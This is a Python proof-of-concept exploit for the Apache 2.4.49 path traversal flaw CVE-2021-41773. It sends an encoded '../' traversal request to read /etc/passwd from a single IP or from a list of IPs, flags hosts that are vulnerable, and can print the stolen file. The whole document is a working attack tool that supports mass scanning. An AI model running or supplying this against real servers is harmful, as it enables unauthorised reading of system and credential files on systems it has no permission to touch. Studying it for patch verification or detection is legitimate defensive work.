# CVE-2021-41773
# https://www.tenable.com/blog/cve-2021-41773-path-traversal-zero-day-in-apache-http-server-exploited

# Usage: 
# ./CVE-2021-41773 -i 10.10.10.10 

#!/usr/bin/env python3
import urllib3
from urllib3.util.timeout import Timeout
import argparse
from colorama import Fore,Style
from signal import signal, SIGINT
from sys import exit



parserargs = argparse.ArgumentParser()
parserargs.add_argument("-i", "--ip", help="Ip to scan")
parserargs.add_argument("-l", "--list", help="List of ip's to scan")
parserargs.add_argument("-s", "--show-output", help="show output from vunerable server", action="store_true")
args = parserargs.parse_args()


def banner():
    return Fore.CYAN+ """   _______      ________    ___   ___ ___  __        _  _  __ ______ ______ ____  
  / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |      | || |/_ |____  |____  |___ \ 
 | |     \ \  / /| |__ ______ ) | | | | ) || |______| || |_| |   / /    / /  __) |
 | |      \ \/ / |  __|______/ /| | | |/ / | |______|__   _| |  / /    / /  |__ < 
 | |____   \  /  | |____    / /_| |_| / /_ | |         | | | | / /    / /   ___) |
  \_____|   \/   |______|  |____|\___/____||_|         |_| |_|/_/    /_/   |____/ 
                                                                                                                                                                   
    """+Fore.RESET + "\nApache 2.4.49 Path Traversal 0Day\nPoc Created By: Ac1d\n"


def checkForCVE(ip,args):
    try:
        http = urllib3.PoolManager()
        url = rf"http://{ip}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
        #http = ProxyManager("http://127.0.0.1:8080")
        r = http.request("GET", url, timeout=Timeout(connect=2.0, read=2.0))
        if "0:0:root:" in r.data.decode('utf-8'):
            print(Fore.GREEN+"[+] Vunerable!"+Fore.RESET+f"\n[-] IP: {ip}"+f"\n[-] Url: {url}\n")
            if args.show_output:
                print(r.data.decode('utf-8'))
        else:
            print(Fore.RED + "[!] Not Vunerable" + Fore.RESET+ f"\n[-] IP: {ip}")
    except Exception as e:
        return

def main():
    print(banner())
    
    if args.ip:
        checkForCVE(args.ip, args)
        return
    if  args.list == None:
        print("Please provide an ip or list!\nExiting...")
        exit(0)
    if args.list:
       
        for ip in open(args.list, "r"):
            checkForCVE(ip.strip(), args)

def handler(sig, frame):
    print(Fore.Red + '[-] Exiting...'+Fore.RESET)
    exit(0)


    
if __name__ == '__main__':
    signal(SIGINT, handler)
    main()